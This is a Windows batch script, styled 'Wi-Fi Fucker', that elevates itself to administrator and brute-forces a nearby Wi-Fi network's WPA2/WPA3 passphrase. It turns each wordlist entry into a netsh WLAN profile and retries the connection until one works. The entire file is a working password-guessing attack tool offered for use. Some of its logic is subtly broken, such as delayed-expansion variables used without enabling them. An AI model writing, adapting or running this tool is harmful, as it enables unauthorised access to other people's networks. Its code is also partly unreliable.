@echo off
cd /d "%~dp0"
:admin
color 1
title admin request...

echo    [INFO] Starting Script as an administrator...
net session >nul 2>&1 || (powershell -EP Bypass -NoP -C start "%~0" -verb runas &exit /b)
cls && goto start

:start
color 4
title Initialising...
cls

where netsh >nul 2>&1
if %errorlevel% neq 0 (
    echo    [ERROR] The "netsh" command is not available on this system. Please ensure compatibility.
    echo.
    echo    Press any key to exit.
    pause >nul
    exit /b
)

sc query wlansvc | find /i "RUNNING" >nul 2>&1
if %errorlevel% neq 0 (
    echo    [ERROR] The "WLAN AutoConfig" service is not running, Wi-Fi is disabled, or you are using an Ethernet connection.
    echo.
    echo    Press any key to try again.
    pause >nul
    goto start
)

goto menu

:help
title Help - Everything you need to know
color e
cls
echo    ====================================
echo                   HELP
echo    ====================================
echo.
echo    Dependencies: Powershell, At least Windows 10
echo.
echo    Press any key to return to the menu.
pause >nul
goto menu

:menu
cls
title Wi-Fi Fucker - Fuck'em all!
color 5

goto show_interface

:show_interface
cls
set "bannerpath=%~dp0content\banner.txt"
if not exist "%~dp0content\" mkdir "%~dp0content"
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo    [ERROR] Banner file not found. Skipping.
)
echo    ===================================
echo       Available Network Interfaces:
echo       Scan Time: %date% %time:~0,8%
echo       -h for help or -r to refresh
echo    ===================================
echo.

netsh wlan show interfaces | findstr /R /C:"^ *Name" /C:"^ *Beschreibung" /C:"^ *GUID" /C:"^ *Physische Adresse" /C:"^ *Status" /C:"^ *Signal" /C:"^ *Band"
if %errorlevel% neq 0 (
    echo.
    echo    [ERROR] This Problem may be caused because no Wi-Fi adapter was detected or you are using an Ethernet connection.
    echo    Press any key to return to the menu.
    pause >nul
    goto start
)

echo.
set /p interface="Enter Interface name: "

if /i "%interface%"=="-r" goto show_interface
if /i "%interface%"=="-h" goto help
if "%interface%"=="" (
    echo    [Invalid input] Interface name cannot be empty.
    pause >nul
    goto show_interface
)

goto show_networks

:show_networks
cls
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo    [ERROR] Banner file not found. Skipping.
)
echo    ==================================================
echo             Available Wi-Fi Networks Nearby:
echo              Scan Time: %date% %time:~0,8%
echo       -h for help or -r to refresh or -b to return
echo    ==================================================
echo.
netsh wlan show networks interface="%interface%"
if %errorlevel% neq 0 (
    echo    [ERROR] This Problem may be caused because no Wi-Fi adapter was detected or you are using an Ethernet connection.
    echo    Press any key to return to the menu.
    pause >nul
    goto start
)

:enter_SSID
echo.
set /p SSID="Enter the SSID of the Network: "
if "%SSID%"=="" (
    echo.
    echo    [Invalid input] SSID cannot be left out.
    echo.
    goto enter_SSID
)

set "SSID_with_space=%SSID%"

:enter_WPA
set /p WPA="Enter the WPA version (WPA2 or WPA3): "
if /i "%WPA%"=="WPA2" (
    set "WPA=WPA2PSK"
) else if /i "%WPA%"=="WPA3" (
    set "WPA=WPA3SAE"
) else (
    if "%WPA%"=="" (
        echo.
        echo    [Invalid input] WPA version cannot be left out.
        echo.
    ) else (
        echo.
        echo    [Invalid Input] WPA version "%WPA%" unsupported. Only "WPA2" or "WPA3" are supported.
        echo.
    )
    goto enter_WPA
)

:enter_wordlist
set /p WordlistPath="Enter the name of the wordlist (place your wordlist inside Wi-Fi_Fucker/wordlist) or press enter to use default: "

if "%WordlistPath%"=="" (
    set "WordlistPath=%~dp0wordlist\word.txt"
)

if not exist "%WordlistPath%" (
    echo.
    echo    [ERROR] Wordlist file not found at "%WordlistPath%".
    echo.
    goto enter_wordlist
)

goto check

:check
cls
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo.
    echo    [ERROR] Banner file not found. Skipping.
    echo.
)

for /f %%D in ('powershell -Command "[BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes('%SSID%')).Replace('-', '')"') do (
    set "hex=%%D"
)

set "encryption=AES"
set "conType=ESS"

echo    =======================================================
echo                      Gathered Information:
echo    =======================================================
echo       Interface:        %interface%
echo       SSID:             %SSID%
echo       Wordlist Path:    %WordlistPath%
echo       WPA Version:      %WPA%
echo       HEX:              %hex%
echo       Encryption:       %encryption%
echo       Connection Type:  %conType%
echo    =======================================================
echo.
echo.

set /p checkTable="Do you want to edit these Values (Y/N): "
if /i "%checkTable%"=="Y" goto edit
if /i "%checkTable%"=="N" goto create_xml
echo.
echo    [Invalid input] Please enter "Y" to continue or "N" to edit.
pause >nul
goto check

:edit
cls
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo.
    echo    [ERROR] Banner file not found. Skipping.
    echo.
)
echo    WARNING! IT'S HIGHLY RECOMMENDED NOT TO EDIT THESE VALUES!
echo.
echo    Type in the new Values. Press enter to skip a Value.
echo.

set /p new_interface="Enter Interface to use (current: %interface%): "
if not "%new_interface%"=="" set "interface=%new_interface%"
set /p new_SSID="Enter SSID to attack (current: %SSID%): "
if not "%new_SSID%"=="" set "SSID=%new_SSID%"
set /p new_WordlistPath="Wordlist to use (current: %WordlistPath%): "
if not "%new_WordlistPath%"=="" set "WordlistPath=%new_WordlistPath%"
set /p new_WPA="WPA version to use (current: %WPA%): "
if not "%new_WPA%"=="" set "WPA=%new_WPA%"
set /p new_hex="Hex code for SSID (current: %hex%): "
if not "%new_hex%"=="" set "hex=%new_hex%"
set /p new_encryption="Encryption Type of Target (current: %encryption%): "
if not "%new_encryption%"=="" set "encryption=%new_encryption%"
set /p new_conType="Connection Type to use (current: %conType%): "
if not "%new_conType%"=="" set "conType=%new_conType%"
goto check

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:create_xml

set "batch=0"
set "SSID_with_space="
set "SSID_escaped="

sc query wlansvc | find /i "RUNNING" >nul 2>&1
if not errorlevel 0 (
    echo    [ERROR] The "WLAN AutoConfig" service is not running or Wi-Fi is disabled or you are using an Ethernet connection.
    pause
    goto start
)

if not exist "%WordlistPath%" (
    echo    [ERROR] The wordlist file does not exist or the path is invalid.
    pause
    goto show_networks
)

for /f "delims=" %%A in ("%WordlistPath%") do set "check_line=%%A"
if "%check_line%"=="" (
    echo    [ERROR] The wordlist is empty or invalid.
    pause >nul
    goto show_networks
)

echo.
echo    [INFO] Checking for old Profiles...
if not exist "Profiles" mkdir "Profiles"
del /q "Profiles\*.xml" >nul 2>&1
netsh wlan delete profile name="%SSID%" >nul
echo.
echo    [INFO] Generating XML Files...
ping 127.0.0.1 -n 2 > nul
cls
if exist "%bannerpath%" (
    type "%bannerpath%"
) else (
    echo.
    echo    [ERROR] Banner file not found. Skipping.
    echo.
)

set "file_count=0"
set "group_number=1"

for /f "tokens=*" %%A in (%WordlistPath%) do (
    call :processline "%%A"
    set /a file_count+=1
    if !file_count! EQU 10 (
        echo.
        echo    --- Processing group %group_number% with 10 files ---
        call :process_group
        set /a group_number+=1
        set "file_count=0"
    )
)

if %file_count% GTR 0 (
    echo.
    echo    --- Processing remaining %file_count% files ---
    call :process_group
)

goto :eof

:processline
set "line=%~1"
set "line=%line:&=&amp;%"
set "line=%line:<=&lt;%"
set "line=%line:>=&gt;%"
set "line=%line:'=&apos;%" 
set "line=%line:"=&quot;%"

set /a batch=batch+1

(
    echo ^<?xml version="1.0"?^>
    echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>
    echo     ^<name^>%SSID%^</name^>
    echo     ^<SSIDConfig^>
    echo         ^<SSID^>
    echo             ^<name^>%SSID%^</name^>
    echo         ^</SSID^>
    echo     ^</SSIDConfig^>
    echo     ^<connectionType^>%conType%^</connectionType^>
    echo     ^<connectionMode^>auto^</connectionMode^>
    echo     ^<MSM^>
    echo         ^<security^>
    echo             ^<authEncryption^>
    echo                 ^<authentication^>%WPA%^</authentication^>
    echo                 ^<encryption^>%encryption%^</encryption^>
    echo                 ^<useOneX^>false^</useOneX^>
    echo             ^</authEncryption^>
    echo             ^<sharedKey^>
    echo                 ^<keyType^>passPhrase^</keyType^>
    echo                 ^<protected^>false^</protected^>
    echo                 ^<keyMaterial^>%line%^</keyMaterial^>
    echo             ^</sharedKey^>
    echo         ^</security^>
    echo     ^</MSM^>
    echo     ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^>
    echo         ^<enableRandomization^>false^</enableRandomization^>
    echo     ^</MacRandomization^>
    echo ^</WLANProfile^>
) > Profiles\%batch%.xml
goto :eof

:process_group
for /f "delims=" %%F in ('dir /b "Profiles\*.xml"') do (
    netsh wlan add profile filename="Profiles\%%F" user=current interface="%interface%"
    netsh wlan connect name="%SSID%"
    ping 127.0.0.1 -n 5 >nul

    netsh wlan show interfaces | findstr /C:"%SSID%" >nul
    if %ERRORLEVEL%==0 (
        echo.
        echo     [INFO] Successfully connected to %SSID%!
        echo.
        goto return
    ) else (
        echo.
        echo     [INFO] Failed to connect using profile %%F. Continuing...
        echo.
    )
)
del /q "Profiles\*.xml" >nul 2>&1
goto :eof

:return
set /p option="Do you want to leave Wi-Fi Fucker (l) or return to the main menu (m): "
if /i "%option%"=="l" exit
if /i "%option%"=="m" goto menu
echo.
echo     [Invalid input] Please enter "l" to leave or "m" to return to the menu.
pause >nul
goto return
